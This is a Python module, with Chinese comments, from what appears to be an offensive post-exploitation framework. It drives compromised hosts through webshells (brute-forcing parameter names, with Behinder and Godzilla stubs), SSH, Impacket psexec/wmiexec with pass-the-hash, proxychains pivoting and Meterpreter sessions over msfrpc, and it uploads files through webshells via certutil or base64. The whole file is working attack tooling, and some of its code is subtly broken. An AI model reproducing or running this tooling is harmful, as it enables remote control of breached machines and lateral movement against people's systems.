# remote_executor/executors.py
"""
远程命令执行器

提供多种远程执行方式:
- WebShell执行器: 通过HTTP执行命令
- SSH执行器: 通过SSH执行命令
- Impacket执行器: 通过psexec/wmiexec执行
- 代理执行器: 通过SOCKS5代理执行命令
"""
import os
import re
import json
import time
import base64
import subprocess
import requests
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import urljoin

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False


@dataclass
class ExecutionResult:
    """执行结果"""
    success: bool
    output: str
    error: str
    exit_code: int = 0
    duration: float = 0.0


class WebShellExecutor:
    """
    WebShell命令执行器

    支持类型:
    - 自定义WebShell: 通过GET/POST参数执行
    - 冰蝎: 需要解密
    - 哥斯拉: 需要解密
    """

    def __init__(self, url: str, password: str = "", shell_type: str = "custom"):
        self.url = url
        self.password = password
        self.shell_type = shell_type
        self.timeout = 30

    def execute(self, command: str, timeout: int = 30) -> ExecutionResult:
        """
        执行命令

        Args:
            command: 要执行的命令
            timeout: 超时时间

        Returns:
            ExecutionResult
        """
        start_time = time.time()

        if self.shell_type == "behinder":
            return self._execute_behinder(command, timeout)
        elif self.shell_type == "godzilla":
            return self._execute_godzilla(command, timeout)
        else:
            return self._execute_custom(command, timeout)

    def _execute_custom(self, command: str, timeout: int) -> ExecutionResult:
        """执行自定义WebShell"""
        try:
            # 尝试常见的WebShell参数名
            param_names = ['cmd', 'command', 'c', 'a', 'code', 'exec', 'shell', '1', 'pass']

            for param in param_names:
                # GET请求
                try:
                    resp = requests.get(
                        self.url,
                        params={param: command},
                        timeout=timeout,
                        verify=False
                    )
                    if resp.status_code == 200 and len(resp.text) > 0:
                        # 检查是否像命令输出
                        if not resp.text.startswith('<') or '\n' in resp.text:
                            return ExecutionResult(
                                success=True,
                                output=resp.text.strip(),
                                error="",
                                duration=time.time() - start_time
                            )
                except Exception:
                    pass

                # POST请求
                try:
                    resp = requests.post(
                        self.url,
                        data={param: command},
                        timeout=timeout,
                        verify=False
                    )
                    if resp.status_code == 200 and len(resp.text) > 0:
                        if not resp.text.startswith('<') or '\n' in resp.text:
                            return ExecutionResult(
                                success=True,
                                output=resp.text.strip(),
                                error="",
                                duration=time.time() - start_time
                            )
                except Exception:
                    pass

            return ExecutionResult(
                success=False,
                output="",
                error="无法找到有效的WebShell参数",
                duration=time.time() - start_time
            )

        except Exception as e:
            return ExecutionResult(
                success=False,
                output="",
                error=str(e),
                duration=time.time() - start_time
            )

    def _execute_behinder(self, command: str, timeout: int) -> ExecutionResult:
        """执行冰蝎WebShell (需要解密)"""
        # 冰蝎使用AES加密，需要密钥
        # 这里简化处理，实际需要完整的解密实现
        return ExecutionResult(
            success=False,
            output="",
            error="冰蝎WebShell需要实现AES解密",
            duration=0
        )

    def _execute_godzilla(self, command: str, timeout: int) -> ExecutionResult:
        """执行哥斯拉WebShell (需要解密)"""
        return ExecutionResult(
            success=False,
            output="",
            error="哥斯拉WebShell需要实现解密",
            duration=0
        )

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """上传文件 (通过WebShell)"""
        try:
            with open(local_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode()

            # 生成上传命令
            if 'windows' in self._detect_os().lower():
                cmd = f"echo {content} | certutil -decode - {remote_path}"
            else:
                cmd = f"echo '{content}' | base64 -d > {remote_path}"

            result = self.execute(cmd)
            return result.success
        except Exception:
            return False

    def _detect_os(self) -> str:
        """检测操作系统"""
        result = self.execute("whoami")
        if result.success:
            if "\\" in result.output or "administrator" in result.output.lower():
                return "windows"
        result = self.execute("id")
        if result.success:
            return "linux"
        return "unknown"


class SSHExecutor:
    """
    SSH命令执行器

    功能:
    - 密码认证
    - 密钥认证
    - 命令执行
    - 文件传输
    """

    def __init__(self, host: str, username: str, password: str = "",
                 private_key: str = "", port: int = 22):
        self.host = host
        self.username = username
        self.password = password
        self.private_key = private_key
        self.port = port
        self.client = None

    def connect(self) -> bool:
        """建立SSH连接"""
        if not PARAMIKO_AVAILABLE:
            print("[SSHExecutor] paramiko未安装")
            return False

        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            if self.private_key:
                if os.path.exists(self.private_key):
                    key = paramiko.RSAKey.from_private_key_file(self.private_key)
                else:
                    import io
                    key = paramiko.RSAKey.from_private_key(io.StringIO(self.private_key))
                self.client.connect(
                    self.host, self.port, self.username,
                    pkey=key, timeout=10
                )
            else:
                self.client.connect(
                    self.host, self.port, self.username,
                    self.password, timeout=10
                )
            return True
        except Exception as e:
            print(f"[SSHExecutor] 连接失败: {e}")
            return False

    def disconnect(self):
        """断开连接"""
        if self.client:
            self.client.close()
            self.client = None

    def execute(self, command: str, timeout: int = 30) -> ExecutionResult:
        """执行命令"""
        start_time = time.time()

        if not self.client:
            if not self.connect():
                return ExecutionResult(
                    success=False,
                    output="",
                    error="SSH连接失败",
                    duration=0
                )

        try:
            stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()

            return ExecutionResult(
                success=exit_code == 0,
                output=output,
                error=error,
                exit_code=exit_code,
                duration=time.time() - start_time
            )
        except Exception as e:
            return ExecutionResult(
                success=False,
                output="",
                error=str(e),
                duration=time.time() - start_time
            )

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """上传文件 (SFTP)"""
        if not self.client:
            if not self.connect():
                return False

        try:
            sftp = self.client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            return True
        except Exception as e:
            print(f"[SSHExecutor] 上传失败: {e}")
            return False

    def download_file(self, remote_path: str, local_path: str) -> bool:
        """下载文件 (SFTP)"""
        if not self.client:
            if not self.connect():
                return False

        try:
            sftp = self.client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            return True
        except Exception as e:
            print(f"[SSHExecutor] 下载失败: {e}")
            return False


class ImpacketExecutor:
    """
    Impacket命令执行器

    支持方法:
    - psexec.py
    - wmiexec.py
    - smbexec.py
    - atexec.py
    """

    # 脚本路径
    SCRIPT_PATHS = [
        "/usr/share/doc/python3-impacket/examples",
        "/usr/local/share/impacket",
        "/opt/impacket/examples",
    ]

    def __init__(self, host: str, username: str, password: str = "",
                 hash_: str = "", domain: str = "", method: str = "psexec"):
        self.host = host
        self.username = username
        self.password = password
        self.hash = hash_
        self.domain = domain
        self.method = method
        self.scripts_dir = self._find_scripts_dir()

    def _find_scripts_dir(self) -> Optional[str]:
        """查找impacket脚本目录"""
        for path in self.SCRIPT_PATHS:
            if os.path.exists(path):
                return path
        return None

    def execute(self, command: str, timeout: int = 60) -> ExecutionResult:
        """执行命令"""
        start_time = time.time()

        script_map = {
            "psexec": "psexec.py",
            "wmiexec": "wmiexec.py",
            "smbexec": "smbexec.py",
            "atexec": "atexec.py"
        }

        script_name = script_map.get(self.method, "psexec.py")

        # 查找脚本
        script_path = None
        if self.scripts_dir:
            script_path = os.path.join(self.scripts_dir, script_name)
            if not os.path.exists(script_path):
                script_path = None

        if not script_path:
            # 尝试直接使用命令
            script_path = script_name

        # 构建命令
        cmd = ["python3", script_path]

        # 认证
        if self.domain:
            auth = f"{self.domain}/{self.username}"
        else:
            auth = self.username

        if self.hash:
            cmd.extend(["-hashes", self.hash])
            cmd.append(f"{auth}@{self.host}")
        else:
            cmd.append(f"{auth}:{self.password}@{self.host}")

        # 要执行的命令
        cmd.append(command)

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            output = result.stdout
            error = result.stderr

            # 检查是否成功
            success = result.returncode == 0 and "[-]" not in output

            return ExecutionResult(
                success=success,
                output=output,
                error=error,
                exit_code=result.returncode,
                duration=time.time() - start_time
            )

        except subprocess.TimeoutExpired:
            return ExecutionResult(
                success=False,
                output="",
                error="执行超时",
                duration=time.time() - start_time
            )
        except Exception as e:
            return ExecutionResult(
                success=False,
                output="",
                error=str(e),
                duration=time.time() - start_time
            )


class ProxyExecutor:
    """
    代理执行器

    通过SOCKS5代理执行命令
    支持proxychains方式
    """

    def __init__(self, proxy_host: str, proxy_port: int, proxy_type: str = "socks5"):
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.proxy_type = proxy_type
        self.proxychains_conf = "/etc/proxychains4.conf"

    def execute_via_proxychains(self, command: str, timeout: int = 60) -> ExecutionResult:
        """通过proxychains执行命令"""
        start_time = time.time()

        # 检查proxychains配置
        if not self._check_proxychains_config():
            self._setup_proxychains_config()

        try:
            cmd = ["proxychains4", "-q"] + command.split()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            return ExecutionResult(
                success=result.returncode == 0,
                output=result.stdout,
                error=result.stderr,
                exit_code=result.returncode,
                duration=time.time() - start_time
            )
        except Exception as e:
            return ExecutionResult(
                success=False,
                output="",
                error=str(e),
                duration=time.time() - start_time
            )

    def execute_impacket_via_proxy(
        self, host: str, username: str, password: str,
        command: str, method: str = "psexec"
    ) -> ExecutionResult:
        """通过代理执行impacket命令"""
        impacket_exec = ImpacketExecutor(
            host=host,
            username=username,
            password=password,
            method=method
        )

        # 设置环境变量使impacket走代理
        env = os.environ.copy()
        env["PROXYCHAINS_PROG"] = f"socks5://{self.proxy_host}:{self.proxy_port}"

        return impacket_exec.execute(command)

    def _check_proxychains_config(self) -> bool:
        """检查proxychains配置"""
        try:
            with open(self.proxychains_conf, 'r') as f:
                content = f.read()
                return f"{self.proxy_host} {self.proxy_port}" in content
        except Exception:
            return False

    def _setup_proxychains_config(self):
        """设置proxychains配置"""
        try:
            # 在配置文件末尾添加代理
            with open(self.proxychains_conf, 'a') as f:
                f.write(f"\n{self.proxy_type} {self.proxy_host} {self.proxy_port}\n")
        except Exception as e:
            print(f"[ProxyExecutor] 配置proxychains失败: {e}")


# ==================== 便捷函数 ====================

class MeterpreterExecutor:
    """
    Meterpreter会话执行器

    通过msfrpc与Metasploit交互执行命令
    """

    def __init__(self, session_id: str, rpc_host: str = "127.0.0.1", rpc_port: int = 55553, rpc_password: str = "password"):
        self.session_id = session_id
        self.rpc_host = rpc_host
        self.rpc_port = rpc_port
        self.rpc_password = rpc_password
        self._token = None

    def _connect(self) -> bool:
        """连接到msfrpc"""
        try:
            import requests
            url = f"http://{self.rpc_host}:{self.rpc_port}/api/v1/auth/login"
            resp = requests.post(url, json={"username": "msf", "password": self.rpc_password}, timeout=10)
            if resp.status_code == 200:
                self._token = resp.json().get("token")
                return True
        except Exception as e:
            print(f"[MeterpreterExecutor] 连接msfrpc失败: {e}")
        return False

    def execute(self, command: str, timeout: int = 60) -> ExecutionResult:
        """在meterpreter会话中执行命令"""
        start_time = time.time()

        if not self._token and not self._connect():
            return ExecutionResult(
                success=False,
                output="",
                error="无法连接到msfrpc"
            )

        try:
            import requests
            url = f"http://{self.rpc_host}:{self.rpc_port}/api/v1/sessions/{self.session_id}/meterpreter"

            # 执行命令
            resp = requests.post(
                url,
                headers={"Authorization": f"Bearer {self._token}"},
                json={"command": command},
                timeout=timeout
            )

            if resp.status_code == 200:
                result = resp.json()
                return ExecutionResult(
                    success=True,
                    output=result.get("data", ""),
                    error="",
                    duration=time.time() - start_time
                )
            else:
                return ExecutionResult(
                    success=False,
                    output="",
                    error=f"执行失败: {resp.status_code}",
                    duration=time.time() - start_time
                )

        except Exception as e:
            return ExecutionResult(
                success=False,
                output="",
                error=str(e),
                duration=time.time() - start_time
            )


def execute_on_session(session, command: str, timeout: int = 60) -> ExecutionResult:
    """
    在会话上执行命令

    根据会话类型自动选择执行器
    """
    from .session_manager import ShellType

    if session.session_type == ShellType.WEBSHELL:
        executor = WebShellExecutor(
            url=session.url,
            password=session.password,
            shell_type=session.metadata.get("shell_type", "custom")
        )
        return executor.execute(command, timeout)

    elif session.session_type == ShellType.SSH:
        executor = SSHExecutor(
            host=session.host,
            username=session.username,
            password=session.password,
            private_key=session.private_key,
            port=session.port
        )
        result = executor.execute(command, timeout)
        executor.disconnect()
        return result

    elif session.session_type == ShellType.IMPACKET:
        executor = ImpacketExecutor(
            host=session.host,
            username=session.username,
            password=session.password,
            hash_=session.metadata.get("hash", ""),
            domain=session.metadata.get("domain", ""),
            method=session.metadata.get("method", "psexec")
        )
        return executor.execute(command, timeout)

    elif session.session_type == ShellType.METERPRETER:
        executor = MeterpreterExecutor(
            session_id=session.id,
            rpc_host=session.metadata.get("rpc_host", "127.0.0.1"),
            rpc_port=session.metadata.get("rpc_port", 55553),
            rpc_password=session.metadata.get("rpc_password", "password")
        )
        return executor.execute(command, timeout)

    else:
        return ExecutionResult(
            success=False,
            output="",
            error=f"不支持的会话类型: {session.session_type}"
        )